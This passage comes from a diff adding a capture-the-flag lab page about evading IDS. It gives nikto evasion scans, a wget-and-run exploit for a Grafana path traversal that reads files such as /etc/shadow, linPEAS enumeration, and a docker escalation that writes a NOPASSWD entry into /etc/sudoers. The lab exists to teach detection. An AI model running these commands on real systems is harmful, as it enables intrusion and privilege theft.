be the only option for example, if valuable assets are involved. In other cases partial evasion may be just as good as low severity IDS alerts particularly from, NIDS are much less likely to be investigated, or even forwarded further up the alert management chain. Again, this is reflected by the scoring system as it will take the reliability of each of the attached IDS into account when scoring alerts.<br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What scale is used to measure alert severity in Suricata? (*-*)<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="4">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                How many services is nmap able to fully recognise when the service scan (-sV) is performed?
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="4">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-5">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 5                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Further Reconnaissance Evasion
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse5" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Of course, <code>nmap</code> is not the only tool that features IDS evasion tools. As an example the web-scanner <code>nikto</code> also features a number of options that we will experiment with within this task, where we perform more aggressive scans to enumerate the services we have already discovered. In general, <code>nikto</code> is a much more aggressive scanner than <code>nmap</code> and is thus harder to conceal; however, these more aggressive scans can return more useful information in some cases. Let's start by running <code>nikto</code> with the minimum options:</p><p><code>nikto -p 80,3000 -h MACHINE_IP</code></p><p><span style="font-size:1rem">Note, that we need to specify that we want to scan both of the web-services present on the device and not just the business website. This should return some useful information but also generate a huge number of alerts about, 7000 of them in total.&nbsp; Let's run through some simple options to reduce this. The first step would probably be to stop scanning the business website at all, have a look around, do you see any evidence of interactive elements or a web application framework? Static sites do not generate many vulnerabilities on their own so it's probably best to consider that attack vector closed for now. Remember,&nbsp;</span><code>nikto</code><span style="font-size:1rem"> is a pure web scanner and will not search other services for actor vectors. We can update the command like so:</span></p><p><code>nikto -p 3000 -h MACHINE_IP</code></p><p><span style="font-size:1rem">Next, we should consider that </span><code>nikto </code><span style="font-size:1rem">will search every possible category of vulnerability by default. This usually isn't necessary in the real world or in a CTF where options like denial of service attacks aren't that helpful or even counterproductive, lets's update the command to reflect this, in this case, I've asked </span><code>nikto</code><span style="font-size:1rem"> to only check for; interesting files, misconfiguration, and information disclosure. A full list of tuning options is available in the help screen</span><code> (-H)</code><span style="font-size:1rem">, I recommend that you experiment with different combinations and make note of the resultant information.</span><br></p><p><code>nikto -p 3000 -T 1 2 3 -h MACHINE_IP</code></p><p>You should also notice, that the scan was executed a lot quicker than the previous scans keep this in mind for future CTFs, there are benefits to putting extra configuration work in beyond keeping a low profile. Finally, we should consider the evasion options available with <code>nikto</code>. First, let's make sure that a more appropriative User-Agent is used as again, the default one is not designed to be stealthy, you'll find that this is a common theme across many different scanners:</p><p><code>nikto -p3000 -T 1 2 3 -useragent &lt;AGENT_HERE&gt; -h MACHINE_IP</code><br></p><p>This should make the scan a little more subtle. In theory, we could also go further and use a selection of the IDS evasion modes available with <code>nikto</code> these are set with the <code>-e</code> flag:</p><p><code>nikto -p3000 -T 1 2 3 -useragent &lt;AGENT_HERE&gt;  -e 1 7 -h MACHINE_IP</code></p><p>In this case, I've set two evasion options; random URL encoding and random URL casing, try running the scan now. Once the scan completes you should see that the number of IDS alerts generated by the scan have actually increased following the addition of the evasion technique flags.&nbsp; Modern NIDS like, Suricata are also capable of detecting unusual data in packets like unexpected character and invalid headers and so, by activating the evasion techniques we've increased the detectability of our scan as it now also features broken HTTP headers as well as known exploits.<br></p><p>There are also more complex evasion options beyond clever usage of certain web scanner features; however, many of these options require additional resources that may simply not be available in or outside of a CTF environment. For example, if you were to somehow gain access to a large enough botnet it may be possible to simply overwhelm the target IDS or IDS operators by flooding the system with alerts from many hosts and attack vectors and thus conceal the real attack. This strategy may also simply crash any IDS that's protecting the service if enough packets are sent though, most IDS use some form of throughput limiter. In fact, I've adjusted the limiter in Wazuh to output as fast as possible for this CTF otherwise, it would take too long to process all of the alerts generated by aggressive scans.</p><p>More practical options from the field of open-source intelligence may also be available and will be covered in the next task.<br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Nikto, should find an interesting path when the first scan is performed, what is it called?
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: /*****" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="5">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>What value is used to toggle denial of service vectors when using scan tuning (-T) in nikto?<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="5">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Which flags are used to modify the request spacing in nikto? Use commas to separate the flags in your answer.<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *,*,*" value="">
+                            <input type="hidden" value="3">
+                            <input type="hidden" value="5">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-6">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 6                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Open-source Intelligence
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse6" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Continuing, from the sonar analogy from earlier, if&nbsp;<code>nmap</code> and other scanners are active sonar, then open-source intelligence or OSINT is passive sonar as intelligence is gained not from active probes but from "listening" to the information that the target freely distributes or by, acquiring information from sources discontented from the target.</p><p>Most forms of OSINT are affectivity undetectable and thus are extremely effective against IDS however, there are limitations as by its nature, OSINT relies on the target to disclose information which, may not happen if the target isn't publicly available or is designed to reduce data disclosure. A good example of this is the <a href="https://www.wireguard.com/protocol/#dos-mitigation" target="_blank">Wireguard</a> VPN protocol which will not respond to queries unless they come from an authenticated source making, it invisible to third-party scan sites like shodan.<br></p><p>In terms of information that can be gathered from third parties the following sources may be available as a starting point:<br></p><ul><li>Information on the services active on a node can be acquired with tools like Shodan.</li><li>Additional resources may be found using search engines and advanced tags like :site, :filetype or :title.<br></li><li>Subdomains and related IP addresses may be found using online scanners or tools like<code> recon-ng</code>; a poorly chosen subdomain may also reveal information about the target even if it is protected behind a firewall.<br></li><li>ASN and WHOIS queries may reveal what provider is responsible for hosting the site.</li></ul><p>Information may also be gathered from the target site and related assets if they are publicly available including:</p><ul><li>The technologies used to host the site may be acquired from error pages, file extensions, debug pages, or the server tag used in an HTTP response </li><li>Additional information on the tools used by the target may be available in job listings</li></ul><p>For this demo, have a look around the "public" facing site and see how much information you can acquire. <br></p><p></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What version of Grafana is the server running?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *.*.*" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="6">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What is the ID of the severe CVE that affects this version of Grafana?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **************" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="6">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>If this server was publicly available, What site might have information on its services already?<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="">
+                            <input type="hidden" value="3">
+                            <input type="hidden" value="6">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>How would we search the site "example.com" for pdf files, using advanced Google search tags?<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ****:*******.*** ********:***" value="">
+                            <input type="hidden" value="4">
+                            <input type="hidden" value="6">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-7">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 7                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Rulesets 
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse7" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Any signature-based IDS is ultimately reliant, on the quality of its ruleset; attack signatures must be well defined, tested, and consistently applied otherwise, it is likely that an attack will remain undetected. It is also important that the rule set be, kept up to date in order to reduce the time between a new exploit being discovered and its signatures being loaded into deployed IDS.&nbsp; Ruleset development is difficult and, all rule sets especially, ones deployed in NIDS will never completely accurate. Inaccurate rules sets may generate false positives or false negatives with both failures affecting the security of the assets under the protection of an IDS. </p><p>In this case, we have identified that one of the target assets is affected by a critical vulnerability which, will allow us to by-parse authentication and gain read access to almost any file on the system. It's been a while since this<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798" target="_blank"> vulnerability</a> was made public so its signature is available in the Emerging Threats Open ruleset which is loaded by default in Suricata. Let's run this exploit and see if we are detected; First, grab the script to run this exploit from GitHub:</p><p><code>wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/exploit.py<br></code></p><p>Once the script has finished downloading you can then run it with:</p><p><code>python3 exploit.py -u MACHINE_IP -p 3000 -f &lt;REMOTE FILE TO READ&gt;</code><br></p><p>See what you can find on the server, remember that the exploit, gives us access to the same privileges of the user that's running the service. Once you're happy with what you've found on the server have a look a the IDS alert history at <code>MACHINE_IP:8000/alerts</code>. Can you see any evidence that this particular exploit was detected? like I said not all rule sets are perfect.</p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What is the password of the grafana-admin account?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******************" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="7">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Is it possible to gain direct access to the server now that the grafana-admin password is known? (yay/nay)<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="7">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Are any of the attached IDS able to detect the attack if the file /etc/shadow is requested via the exploit, if so what IDS detected it?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********" value="">
+                            <input type="hidden" value="3">
+                            <input type="hidden" value="7">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-8">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 8                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Host Based IDS (HIDS)
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse8" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Not all forms of malicious activity involve network traffic that could be detected by a NIDS, ransomware, for example, could be disturbed via an external email service provider installed and executed on a target machine and, only be detected by a NIDS once, it calls home with messages of its success which, of course, is way too late. For this reason, it is often advisable to deploy a host-based IDS alongside a NIDS to check for suspicious activity that occurs on devices and not just over the network including:</p><ul><li>Malware execution</li><li>System configuration changes</li><li>Software errors</li><li>File integrity changes</li><li>Privilege escalation<br></li></ul><p>HIDS deployment can be a lot more complex than NIDS as they often require the installation and management of an agent on each host intended to be covered by the HIDS. This agent typically forwards activity from the data sources on the system to a central management and processing node which then applies the rules to the forwarded data in a manner similar to any other IDS. These data sources typically include:</p><ul><li>Application and system log files</li><li>The Windows registry</li><li>System performance metrics</li><li>The state of the file system itself<br></li></ul><p> This can be hard to manage in a large environment without some form of automated deployment mechanism, like Ansible. It is also often necessary to perform additional configuration work when first deploying a HIDS as the default options are likely to miss certain applications. For example, to create this demo deployment I built custom docker images for each service that was monitored by the HIDS and configured the agent to read from each services log file, performing this for every containerized service on a real network and managing updates would quickly get out of hand unless automation was deployed.</p><p>The primary difference between HIDS and NIDS is the types of activity that they can detect. A HIDS will not typically have access to a log of network traffic and is, therefore, unable to detect certain forms of activity at all or will only be able to detect more aggressive activity. We can demonstrate this now running the following command and taking note of what IDS detects the activity, remembering that Wazuh and Suricata are both attached to the target:<br><code>nmap -sV MACHINE_IP</code></p><p>Wazuh should be able to detect that an insecure SSH connection attempt was made to the server but will not mention the connection to the HTTP server, unlike Suricata. However, if we run:</p><p><code>nmap --script=vuln MACHINE_IP</code></p><p>Wazuh will create thousands of alerts as it will detect each 400 error code created as a result of running the vuln script as this attack creates entries in the error log which, is one of the sources that Wazuh reads from if it has been configured too.&nbsp; <br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What category does Wazuh place HTTP 400 error codes in?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="8">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Play around with some post-exploitation tools and commands and make note of what activity is detected by Wazuh; compare it to the activity that's detected by Suricata.<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="8">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-9">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 9                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Privilege Escalation Recon
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse9" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Now, that an initial foothold has been established it's time to discuss how IDS can track privilege escalation. This is primarily a task for HIDS as many post-exploitation tasks like, privilege escalation do not require communication with the outside world and are hard or impossible to detect with a NIDS. In fact, privilege escalation is our first task as we are not yet root. The first step in privilege escalation is usually checking what permissions we currently have this, could save us a lot of work if we're already in the sudo group. There are a few different ways to check this including:</p><ul><li><code>sudo -l</code> this will return a list of all the commands that an account can run with elevated permissions via <code>sudo</code></li><li><code>groups</code>&nbsp;will list all of the groups that the current user is a part of.</li><li><code>cat /etc/group</code>&nbsp;should return a list of all of the groups on the system and their members. This can help in locating users with higher access privileges and not just our own.</li></ul><p>Run all of these commands and note which ones create an IDS alert, Suricata will be blind to all of this as none of these commands create network activity. It is also possible to check this and more with a script like <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">linPEAS</a>, so far every time we've used a script it has tended to be the source of more information but an increase in alerts. However, this is not always the case. Run&nbsp;<code>linpeas</code> on the system now and take note of how many alerts are created, in relation to the large amount of reconnaissance it performs.</p><p>Of course, this activity isn't completely invisible as <code>linpeas</code> would likely be detected by an antivirus if one was installed though, there are ways to reduce its footprint. There is also the question of transporting the script to the target system, Suricata is capable of detecting when scripts are downloaded via <code>wget</code>&nbsp; , however, TLS restricts its ability to actually detect the traffic without the deployment of web proxy servers. It may also be possible to simply copy and paste the script's content however, most HIDS implement some form of file system integrity monitoring which would detect the addition of the script even if an antivirus was not installed, more on this later.</p><p><span style="font-size:1rem">Either way,&nbsp;</span><code>linpeas</code><span style="font-size:1rem"> should be able to identify a potential privilege escalation vector.</span><br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What tool does linPEAS detect as having a potential escalation vector?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ******" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="9">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Is an alert triggered by Wazuh when linPEAS is added to the system, if so what its severity?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="9">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-10">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse10">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 10                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Performing Privilege Escalation
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse10" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>The last task allowed us to identify Docker as a potential privilege escalation vector. Now it's time to perform the escalation itself. First, though, I should explain how this particular privilege escalation works. In short, this attack leverages a commonly suggested <a href="https://stackoverflow.com/questions/48568172/docker-sock-permission-denied" target="_blank">workaround</a> that allows non-root users to run docker containers. The workaround requires adding a non-privileged user to the <code>docker</code>group which, allows that user to run containers without using <code>sudo</code> or having root privileges. However, this also grants effective root-level privileges to the provided user, as they are able to spawn containers without restriction. </p><p>We can use these capabilities to gain root privileges quite easily try and run the following with the <code>grafana-admin</code> account:</p><p><code>docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master</code><br></p><p>This will spawn a container in interactive mode, overwrite the default entry-point to give us a shell, and mount the hosts file system to root.&nbsp; From within this container, we can then edit one of the following files to gain elevated privileges:</p><ul><li><code>/etc/group</code>&nbsp;We could add the<code> grafana-admin</code> account to the root group. Note, that this file is covered by the HIDS<br></li><li><code>/etc/sudoers</code>&nbsp;Editing this file would allow us to add the grafana-admin account to the sudoers list and thus, we would be able to run <code>sudo</code> to gain extra privileges. Again, this file is monitored by Wazuh.&nbsp; In this case, we can perform this by running:<br><code>echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" &gt;&gt;/mnt/etc/sudoers<br></code><br></li><li>We could add a new user to the system and join the root group via <code>/etc/passwd </code>. Again though, this activity is likely to be noticed by the HIDS</li></ul><p>Try a few of these options and note the resultant IDS alerts.<br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Perform the privilege escalation and grab the flag in /root/<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: {*********************}" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="10">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-11">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse11">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 11                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Establishing Persistence
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse11" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
